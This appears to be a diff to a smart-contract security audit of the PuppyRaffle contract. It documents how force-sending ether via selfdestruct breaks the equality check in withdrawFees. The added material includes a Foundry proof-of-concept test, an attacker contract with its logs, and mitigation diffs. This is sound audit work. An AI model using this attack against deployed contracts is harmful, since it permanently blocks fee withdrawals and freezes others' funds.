@@ -399,16 +399,100 @@ The value of block.difficulty is a constant of 0 since the merge so rarity will 
 
 **Description:** The require statement in `PuppyRaffle::withdrawFees` can be broken be selfdestructing a contract with a little ether and setting PuppyRaffle as the recipient address. The ether balance of PuppyRaffle will be updated and withdraw fees will forever fail the require statement.
 
+```javascript
+    function withdrawFees() external {
+>>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+        uint256 feesToWithdraw = totalFees;
+        totalFees = 0;
+        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
+        require(success, "PuppyRaffle: Failed to withdraw fees");
+    }
+```
+
 **Impact:** The protocol will no longer be able to withdraw fees
 
 **Proof of Concept:**
 
+Logs:
+
+Balance of contract before attack: 800000000000000000
+
+Balance of fees before attack: 800000000000000000
+
+Balance of contract after attack: 800000000000000001
+
+Balance of fees after attack: 800000000000000000
+
 <details>
 <summary> PoC </summary>
+
+Place this test into PuppyRaffleTest.t.sol
+
+```javascript
+ function test_SelfdestructToBreakWithdraw() public {
+        //Enter players
+        address[] memory players = new address[](4);
+        players[0] = address(1);
+        players[1] = address(2);
+        players[2] = address(3);
+        players[3] = address(4);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        //Select winner
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        //Balances before
+        console.log("Balance of contract before attack: ", address(puppyRaffle).balance);
+        console.log("Balance of fees before attack: ", puppyRaffle.totalFees());
+        //Selfdestruct attacker contract
+        SelfdestructAttack attackerContract = new SelfdestructAttack(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.prank(attacker);
+        vm.deal(attacker, 1 wei);
+        attackerContract.attack{value: 1 wei}();
+        //Balances
+        console.log("Balance of contract after attack: ", address(puppyRaffle).balance);
+        console.log("Balance of fees after attack: ", puppyRaffle.totalFees());
+        //Withdraw
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+```
+
+And the following contract
+
+```javascript
+contract SelfdestructAttack {
+    PuppyRaffle puppyRaffle;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+    }
+
+    function attack() public payable {
+        address payable addr = payable(address(puppyRaffle));
+        selfdestruct(addr);
+    }
+}
+```
 
 </details>
 
 **Recommended Mitigation:**
 
-1. Remove the require statement and rework
-2. Instead of an equality check change it to a greater than or equal to check. To ensure that prize funds are not being withdrawn track the prize funds seperately and ensure that the total balance is greater than or equal to the prize + fees.
+1. Instead of an equality check change it to a greater than or equal to check. Rework the contract to track the prizepool and fees as people enter and refund seperately. The require statement can then verify against the current prizepool and totalFees to ensure that prizepool funds are not being withdrawn.
+
+```diff
+    uint256 s_prizepool;
+
+    function withdrawFees() external {
+++      require(address(this).balance >= (uint256(totalFees) + s_prizepool), "PuppyRaffle: There are currently players active!");
+--      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+        uint256 feesToWithdraw = totalFees;
+        totalFees = 0;
+        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
+        require(success, "PuppyRaffle: Failed to withdraw fees");
+    }
+```
+
+2. Instead of an equality check change it to a greater than or equal to check. Rework the contract so it can be paused after a winner is selected to disallow players to join the raffle so the prizepool is 0. Then attempt to withdraw the fees.
